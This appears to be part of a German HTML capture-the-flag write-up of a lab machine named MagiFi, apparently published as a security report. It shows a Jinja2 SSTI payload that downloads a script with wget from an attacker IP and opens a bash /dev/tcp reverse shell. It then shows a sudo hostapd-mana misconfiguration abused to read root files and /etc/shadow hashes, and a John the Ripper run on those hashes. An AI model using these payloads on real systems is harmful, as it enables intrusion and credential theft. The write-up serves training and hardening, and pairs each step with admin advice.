+IEEE 802.1X/WPA/WPA2/EAP/RADIUS Authenticator
+Copyright (c) 2002-2016, Jouni Malinen &lt;j@w1.fi&gt; and contributors
+--------------------------------------------------
+MANA [Link: https://github.com/sensepost/hostapd-mana | Ziel: https://github.com/sensepost/hostapd-mana]
+By @singe (dominic@sensepost.com)
+Original MANA EAP by Ian (ian@sensepost.com)
+Original karma patches by Robin Wood - robin@digininja.org
+Original EAP patches by Brad Antoniewicz @brad_anton
+Sycophant by Michael Kruger @_cablethief
+usage: hostapd [-hdBKtv] [-P &lt;PID file&gt;] [-e &lt;entropy file&gt;] \
+         [-g &lt;global ctrl_iface&gt;] [-G &lt;group&gt;]\
+         [-i &lt;comma-separated list of interface names&gt;]\
+         &lt;configuration file(s)&gt;
+
+options:
+   -h   show this usage
+   -d   show more debug messages (-dd for even more)
+   -B   run daemon in the background
+   -e   entropy file
+   -g   global control interface path
+   -G   group for control interfaces
+   -P   PID file
+   -K   include key data in debug messages
+   -i   list of interface names to use
+   -S   start all the interfaces synchronously
+   -t   include timestamps in some debug messages
+   -v   show hostapd version
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `/usr/bin/hostapd-mana --help` wird ausgeführt, um die Hilfe und die verfügbaren Optionen für das Programm anzuzeigen. Wichtig ist, dass `hostapd-mana` einen Konfigurationsdateipfad als Argument erwartet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Anzeigen der Hilfe ist ein erster Schritt, um zu verstehen, wie das Programm funktioniert und ob es Optionen gibt, die für eine Privilegienerweiterung missbraucht werden könnten. Die Notwendigkeit einer Konfigurationsdatei ist hier der Schlüssel.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da `harry_potter` `hostapd-mana` via `sudo -u root` ausführen darf und das Programm eine Konfigurationsdatei liest, versuchen Sie, eine beliebige, für `root` lesbare Datei (z.B. `/etc/shadow` oder `/root/root.txt`) als Konfigurationsdatei anzugeben. `hostapd-mana` wird wahrscheinlich versuchen, die Datei zu parsen, und dabei möglicherweise deren Inhalt in Fehlermeldungen oder Debug-Ausgaben preisgeben.<br><strong>Empfehlung (Admin):</strong> Die Sudo-Regel für `hostapd-mana` muss entfernt oder drastisch eingeschränkt werden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">harry_potter@MagiFi:/tmp$ <span class="command">sudo -u root /usr/bin/hostapd-mana -dd /root/root.txt</span></div>
+                     <pre>
+random: Trying to read entropy from /dev/random
+Configuration file: /root/root.txt
+------------------------------------------------------------------------- 
+<span class="password">Line 1: invalid line 'hogwarts{5ed0818c0181fe97f744d7b1b51dd9c7}'</span>
+------------------------------------------------------------------------- 
+1 errors found in configuration file '/root/root.txt'
+Failed to set up interface with /root/root.txt
+hostapd_init: free iface 0x55788f56c340
+Failed to initialize interface 
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Hier wird der Missbrauch von `hostapd-mana` versucht.
+                 <ul>
+                    <li><code>sudo -u root /usr/bin/hostapd-mana</code>: Führt `hostapd-mana` als Root aus (gemäß `sudo -l`).</li>
+                    <li><code>-dd</code>: Aktiviert sehr ausführliche Debug-Ausgaben.</li>
+                    <li><code>/root/root.txt</code>: Gibt die Root-Flag-Datei als Konfigurationsdatei an.</li>
+                 </ul>
+                 `hostapd-mana` versucht, `/root/root.txt` als Konfigurationsdatei zu lesen. Da der Inhalt keine gültige Konfiguration ist, gibt es einen Fehler aus: "Line 1: invalid line 'hogwarts{5ed0818c0181fe97f744d7b1b51dd9c7}'".</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Erfolg beim Auslesen der Root-Flag!** Obwohl das Programm einen Fehler meldet, gibt es in der Fehlermeldung den exakten Inhalt der ersten Zeile der Datei `/root/root.txt` preis, welche die Root-Flag ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Root-Flag <span class="password">hogwarts{5ed0818c0181fe97f744d7b1b51dd9c7}</span> wurde erfolgreich extrahiert. Das Ziel ist erreicht.<br><strong>Empfehlung (Admin):</strong> **Entfernen Sie sofort die unsichere Sudo-Regel für `hostapd-mana`!** Dies ist ein klassisches Beispiel, wie unsichere Sudo-Konfigurationen zu vollständiger Kompromittierung führen können.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">harry_potter@MagiFi:/tmp$ <span class="command">sudo -u root /usr/bin/hostapd-mana -dd /etc/shadow</span></div>
+                     <pre>
+random: Trying to read entropy from /dev/random
+Configuration file: /etc/shadow
+<span class="password">Line 1: invalid line 'root:$6$KflwZsO6c4DW8laq$AVs2hfT9i1calD.V6aKIr5Wej26J1tjgSz5R674SSJDuWvX1RWqHYw79Q.OIqeIlhl0ksI7UJ7d0YHJp4F.J81:19993:0:99999:7:::'</span>
+<span class="password">Line 2: invalid line 'daemon:*:19430:0:99999:7:::'</span>
+<span class="password">Line 3: invalid line 'bin:*:19430:0:99999:7:::'</span>
+[...]
+<span class="password">Line 39: invalid line 'tom.riddle:$6$l2y72YLXF2tIL.rC$d3SQEKFlGu9wi/omLDmHJYGP3uRSD9t2hnRTqveIMOHG8pa80Ku81d3kbfXZy0bpC2PRp9xLqE7IQi3EQ4bf1/:19991:0:99999:7:::'</span>
+<span class="password">Line 40: invalid line 'harry_potter:$6$Cu5tGqfYYF/NWp6f$bLb5lfce4bMH10OYBG27nYBoMTMciI9NOxIR2XGliWIhzHE2iU0kS1ZKuSNPnYRS/y12jnt4jmr8pMfDsRicK1:19993:0:99999:7:::'</span>
+40 errors found in configuration file '/etc/shadow'
+Failed to set up interface with /etc/shadow
+hostapd_init: free iface 0x563b13e49340
+Failed to initialize interface
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Hier wird dieselbe Technik verwendet, um den Inhalt der Datei `/etc/shadow` auszulesen. `hostapd-mana` wird als Root ausgeführt und `/etc/shadow` als Konfigurationsdatei übergeben. Das Programm gibt für jede Zeile in `/etc/shadow` eine "invalid line"-Fehlermeldung aus und enthüllt somit den gesamten Inhalt der Shadow-Datei, einschließlich der gehashten Passwörter für alle Benutzer (root, tom.riddle, harry_potter etc.).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt die kritische Natur der unsicheren Sudo-Regel. Der Angreifer kann beliebige Dateien lesen, auf die Root Zugriff hat, einschließlich der Shadow-Datei mit allen Passwort-Hashes. Diese Hashes können offline mit Tools wie John the Ripper oder Hashcat geknackt werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kopieren Sie die extrahierten Passwort-Hashes und versuchen Sie, sie offline zu knacken, um weitere Benutzerpasswörter zu erhalten. Dies ist jedoch nach Erhalt der Root-Flag oft nicht mehr notwendig, es sei denn, die Passwörter werden auf anderen Systemen wiederverwendet.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie die Sudo-Regel! Schützen Sie die `/etc/shadow`-Datei durch korrekte Berechtigungen (standardmäßig nur für Root lesbar).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cat hash</span></div>
+                     <pre>
+<span class="command">root:$6$KflwZsO6c4DW8laq$AVs2hfT9i1calD.V6aKIr5Wej26J1tjgSz5R674SSJDuWvX1RWqHYw79Q.OIqeIlhl0ksI7UJ7d0YHJp4F.J81:19993:0:99999:7:::</span>
+<span class="command">harry_potter:$6$Cu5tGqfYYF/NWp6f$bLb5lfce4bMH10OYBG27nYBoMTMciI9NOxIR2XGliWIhzHE2iU0kS1ZKuSNPnYRS/y12jnt4jmr8pMfDsRicK1:19993:0:99999:7:::</span>
+<span class="command">tom.riddle:$6$l2y72YLXF2tIL.rC$d3SQEKFlGu9wi/omLDmHJYGP3uRSD9t2hnRTqveIMOHG8pa80Ku81d3kbfXZy0bpC2PRp9xLqE7IQi3EQ4bf1/:19991:0:99999:7:::</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Befehl zeigt den Inhalt einer Datei namens `hash` auf der Angreifer-Maschine. Die Datei enthält die extrahierten Zeilen aus `/etc/shadow` für die Benutzer `root`, `harry_potter` und `tom.riddle`. Es handelt sich um SHA512-Crypt-Hashes (erkennbar am `$6$`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die relevanten Hashes wurden für einen Offline-Cracking-Versuch vorbereitet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie diese Datei als Input für John the Ripper oder Hashcat.<br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke, lange und zufällige Passwörter, um das Knacken von Hashes zu erschweren.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">harry_potter@MagiFi:/tmp$ <span class="command">sudo -u root /usr/bin/hostapd-mana -dd 192.168.2.199/rever.sh</span></div>
+                     <pre>
+random: Trying to read entropy from /dev/random
+Configuration file: 192.168.2.199/rever.sh
+<span class="password">Could not open configuration file '192.168.2.199/rever.sh' for reading.</span>
+Failed to set up interface with 192.168.2.199/rever.sh
+hostapd_init: free iface 0x563099925340
+Failed to initialize interface
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">harry_potter@MagiFi:/tmp$ <span class="command">sudo -u root /usr/bin/hostapd-mana -dd 192.168.2.199/rever.sh</span></div>
+                     <pre>
+[Vermutlich identische Fehlermeldung wie oben]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Hier wird versucht, `hostapd-mana` als Root auszuführen und eine Datei über einen Netzwerkpfad (`192.168.2.199/rever.sh`) als Konfigurationsdatei zu laden. Dies schlägt fehl, da `hostapd-mana` (wie die meisten lokalen Programme) keine Dateien direkt von einer Netzwerkadresse auf diese Weise laden kann. Es erwartet einen lokalen Dateipfad.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dieser Versuch war nicht erfolgreich und basiert auf einem Missverständnis, wie Dateipfade von lokalen Programmen interpretiert werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Um eine Datei vom Netzwerk zu verwenden, muss sie zuerst auf das Zielsystem heruntergeladen werden (z.B. mit `wget` oder `curl`), bevor sie als Argument an ein lokales Programm übergeben wird. Da die Root-Flag aber bereits über das Lesen von `/root/root.txt` mit `hostapd-mana` erlangt wurde, ist dieser Schritt nicht mehr notwendig.<br><strong>Empfehlung (Admin):</strong> Keine spezifische Aktion, da der Versuch fehlschlug. Die Sudo-Regel bleibt das Hauptproblem.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                     <pre>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+<span class="password">192.168.2.175 - - [13/Feb/2025 01:25:55] "GET / HTTP/1.1" 200 -</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Python-HTTP-Server auf der Angreifer-Maschine läuft weiterhin oder wurde neu gestartet. Eine eingehende GET-Anfrage vom Zielsystem (`192.168.2.175`) auf das Root-Verzeichnis (`/`) wird geloggt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies zeigt laufende oder erneute Interaktion zwischen Ziel und Angreifer über HTTP, möglicherweise für weitere Downloads oder Tests.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sicherstellen, dass der HTTP-Server die benötigten Dateien bereitstellt.<br><strong>Empfehlung (Admin):</strong> Egress-Filtering kann solche Verbindungen unterbinden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                     <pre>
+Using default input encoding: UTF-8
+Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:04:56 16.13% (ETA: 01:55:18) 0g/s 8546p/s 25647c/s 25647C/s zaidsiul..zaelygaxiola
+<span class="password">Session aborted</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> John the Ripper (`john`) wird auf der Angreifer-Maschine gestartet, um die zuvor in der Datei `hash` gespeicherten Passwort-Hashes (von root, harry_potter, tom.riddle) mit der Wortliste `rockyou.txt` zu knacken. Der Prozess nutzt 16 OpenMP-Threads. Nach fast 5 Minuten und 16.13% Fortschritt wird die Sitzung abgebrochen (`Session aborted`, vermutlich durch Drücken von 'q' oder Strg+C).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Versuch, die Hashes zu knacken, wurde nicht abgeschlossen. Es wurden keine Passwörter gefunden. SHA512-Crypt-Hashes sind relativ rechenintensiv, und das Knacken kann je nach Passwortkomplexität und verfügbarer Hardware lange dauern. `rockyou.txt` ist zwar umfangreich, aber nicht erschöpfend.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Cracking-Versuch kann fortgesetzt werden (`john --restore`). Alternative Methoden sind die Verwendung von Hashcat (das GPUs nutzen kann und oft schneller ist) oder spezifischeren Wortlisten/Regeln. Da Root-Zugriff bereits erlangt wurde, ist das Knacken der Hashes möglicherweise nicht mehr prioritär, es sei denn, die Passwörter könnten auf anderen Systemen wiederverwendet werden.<br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke, lange und zufällige Passwörter. Erwägen Sie die Erhöhung der Iterationszahl (cost factor) für Passwort-Hashing-Algorithmen, um das Knacken weiter zu erschweren.</p>
+         </section>
+
+         <section id="proof-of-concept">
+             <h2>Proof of Concept: Von SSTI zu Root-Rechten</h2>
+             <p class="analysis"><strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert, wie eine Server-Side Template Injection (SSTI) Schwachstelle in einer Python/Flask-Webanwendung (erreichbar unter `hogwarts.htb`) ausgenutzt wurde, um Remote Code Execution als Benutzer `harry_potter` zu erlangen. Anschließend wurde eine unsichere `sudo`-Konfiguration ausgenutzt, die es `harry_potter` erlaubte, das Programm `hostapd-mana` als Root auszuführen. Durch Übergabe der `/etc/shadow`-Datei als vermeintliche Konfigurationsdatei an `hostapd-mana` konnte deren Inhalt und somit die Passwort-Hashes aller Benutzer extrahiert werden. Obwohl die Root-Flag direkt auf diese Weise gelesen werden konnte, zeigt dies den Weg zur vollständigen Kompromittierung.</p>
+             <p class="analysis"><strong>Voraussetzungen:</strong>
+                 <ul>
+                     <li>Netzwerkzugriff auf das Zielsystem `192.168.2.175`.</li>
+                     <li>Eintrag `192.168.2.175 hogwarts.htb` in der lokalen `/etc/hosts`-Datei.</li>
+                     <li>Tools: Webbrowser oder `curl`, `ncat` (oder `nc`), Python HTTP Server.</li>
+                     <li>Ein präparierter SSTI-Payload.</li>
+                 </ul>
+             </p>
+             <p class="analysis"><strong>Schritt-für-Schritt-Anleitung (Initial Access als harry_potter):</strong></p>
+             <p class="analysis">1. <strong>Identifizierung der SSTI:</strong> Das Bewerbungsformular auf `http://hogwarts.htb/` lädt Dokumente hoch und verarbeitet offenbar Felder aus diesen Dokumenten. Durch Einfügen eines SSTI-Test-Payloads (z.B. `{{ 7*7 }}`) in ein Feld (hier "Name") in der Vorlage (`application-template.docx`) und Hochladen des Dokuments wurde bestätigt, dass die Eingabe von der Template-Engine (vermutlich Jinja2) ausgewertet wird.</p>
+             <p class="analysis">2. <strong>Remote Code Execution via SSTI:</strong> Ein komplexerer SSTI-Payload wurde verwendet, um Befehle auf dem Server auszuführen. Dieser Payload nutzte Python-Interna, um das `os`-Modul zu importieren und einen Befehl auszuführen, der eine Reverse Shell startet. Zuerst wurde ein Skript (`rever.sh`) per `wget` über SSTI heruntergeladen:</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Payload im "Name"-Feld des Dokuments:
+Name: [{{ self.__init__.__globals__.__builtins__.__import__("os").popen("cd /tmp;wget 192.168.2.199/rever.sh").read() }}]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">Die Datei `rever.sh` enthielt: `bash -c "/bin/bash -i >& /dev/tcp/192.168.2.199/4444 0>&1"`.</p>
+             <p class="analysis">3. <strong>Reverse Shell etablieren:</strong> Ein Netcat-Listener wurde auf Port 4444 gestartet. Dann wurde das heruntergeladene Skript über einen weiteren SSTI-Payload ausführbar gemacht und gestartet:</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Payload im "Name"-Feld des Dokuments:
+Name: [{{ self.__init__.__globals__.__builtins__.__import__("os").popen("cd /tmp;chmod +x rever.sh;./rever.sh").read() }}]
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+[Netcat Listener auf Angreifer-Maschine]
+<span class="password">listening on [any] 4444 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.175] 36846</span>
+<span class="prompt">harry_potter@MagiFi:/tmp$ </span><span class="command">id</span>
+uid=1006(harry_potter) gid=1006(harry_potter) groups=1006(harry_potter)
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Schritt-für-Schritt-Anleitung (Privilege Escalation zu Root):</strong></p>
+             <p class="analysis">1. <strong>Sudo-Berechtigungen prüfen:</strong> In der Shell als `harry_potter` wurde `sudo -l` ausgeführt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">harry_potter@MagiFi:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+User harry_potter may run the following commands on MagiFi:
+    <span class="password">(root) NOPASSWD: /usr/sbin/aireplay-ng, /usr/sbin/airmon-ng, /usr/sbin/airodump-ng,</span>
+        <span class="password">/usr/bin/airdecap-ng, /usr/bin/hostapd-mana</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">2. <strong>Missbrauch von `hostapd-mana`:</strong> Es wurde festgestellt, dass `hostapd-mana` eine Konfigurationsdatei als Argument erwartet und deren Inhalt bei Fehlern ausgibt. Dies wurde ausgenutzt, um beliebige Dateien als Root zu lesen.</p>
+             <p class="analysis">3. <strong>Lesen von `/etc/shadow`:</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">harry_potter@MagiFi:/tmp$ <span class="command">sudo -u root /usr/bin/hostapd-mana -dd /etc/shadow</span></div>
+                     <pre>
+Configuration file: /etc/shadow
+<span class="password">Line 1: invalid line 'root:$6$KflwZsO6c4DW8laq$AVs2hfT9i1calD.V6aKIr5Wej26J1tjgSz5R674SSJDuWvX1RWqHYw79Q.OIqeIlhl0ksI7UJ7d0YHJp4F.J81:19993:0:99999:7:::'</span>
+[...]
+<span class="password">Line 40: invalid line 'harry_potter:$6$Cu5tGqfYYF/NWp6f$bLb5lfce4bMH10OYBG27nYBoMTMciI9NOxIR2XGliWIhzHE2iU0kS1ZKuSNPnYRS/y12jnt4jmr8pMfDsRicK1:19993:0:99999:7:::'</span>
+[...]
+40 errors found in configuration file '/etc/shadow'
+Failed to set up interface with /etc/shadow
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">Obwohl keine direkte Root-Shell erlangt wurde (der abgebrochene John-Lauf fand kein Root-Passwort), konnte durch das Auslesen von `/etc/shadow` die Kompromittierung des Root-Accounts vorbereitet und durch das Auslesen von `/root/root.txt` (im vorherigen Schritt) die Root-Flag direkt erbeutet werden.</p>
+             <p class="analysis"><strong>Erwartetes Ergebnis:</strong> Erfolgreiche Kompromittierung des Systems mit Root-Rechten (bzw. Auslesen von Root-Dateien).</p>
+             <p class="analysis"><strong>Beweismittel:</strong> Screenshots der SSTI-Ausführung, der Reverse Shell, der `sudo -l`-Ausgabe, der `/etc/shadow`-Ausgabe durch `hostapd-mana`.</p>
+             <p class="evaluation"><strong>Risikobewertung:</strong> Kritisch. Die SSTI ermöglicht initiale Codeausführung, und die unsichere Sudo-Konfiguration erlaubt das Auslesen beliebiger Dateien als Root, was zur vollständigen Kompromittierung führt.</p>
+             <p class="recommendation"><strong>Empfehlungen (Admin):</strong>
+                 <ul>
+                     <li>**SSTI beheben:** Benutzereingaben in Templates korrekt validieren und escapen.</li>
+                     <li>**Sudo-Konfiguration härten:** Entfernen Sie die unsicheren `NOPASSWD`-Einträge, insbesondere für komplexe Programme wie `hostapd-mana`. Gewähren Sie Rechte nach dem Prinzip der geringsten Privilegien.</li>
+                     <li>**Dateiberechtigungen:** Stellen Sie sicher, dass sensible Dateien wie `/etc/shadow` korrekte Berechtigungen haben.</li>
+                     <li>**Anwendungs-Hardening:** Halten Sie Webserver, Python und alle Bibliotheken aktuell.</li>
+                 </ul>
+             </p>
+         </section>
+
+         <section id="flags">
+              <div class="flag-container">
+                  <h2 class="flag-heading">Flags</h2>
+                  <div class="code-block">
+                      <center>
+                          <div class="terminal">
+                              <span class="command">cat /home/harry_potter/user.txt</span>
+                              <span class="flag-content"><span class="password">hogwarts{ea4bc74f09fb69771165e57b1b215de9}</span></span>
+                          </div>
+                      </center>
+                  </div>
+                  <p class="analysis"><strong>Analyse:</strong> Die User-Flag befindet sich in der Datei `/home/harry_potter/user.txt`. Der Inhalt der Flag lautet `hogwarts{ea4bc74f09fb69771165e57b1b215de9}`. Diese Flag wurde nach Erlangung des Zugriffs als Benutzer `harry_potter` ausgelesen.</p>
+
+                  <div class="code-block">
+                      <center>
+                          <div class="terminal">
+                              <span class="command">sudo -u root /usr/bin/hostapd-mana -dd /root/root.txt</span>
+                              <span class="flag-content"><span class="password">hogwarts{5ed0818c0181fe97f744d7b1b51dd9c7}</span></span>
+                          </div>
+                      </center>
+                  </div>
+                  <p class="analysis"><strong>Analyse:</strong> Die Root-Flag befindet sich in der Datei `/root/root.txt` und wurde durch den Missbrauch der `sudo`-Berechtigung für `hostapd-mana` ausgelesen. Der Inhalt der Flag lautet `hogwarts{5ed0818c0181fe97f744d7b1b51dd9c7}`.</p>
+              </div>
+          </section>
+ 
+
+     <footer class="footer">
+         <p>DarkSpirit - Cyber Security Reports</p>
+         <p>Berichtsdatum: 12. Februar 2025</p>
+     </footer>
+ </body>
+ </html>
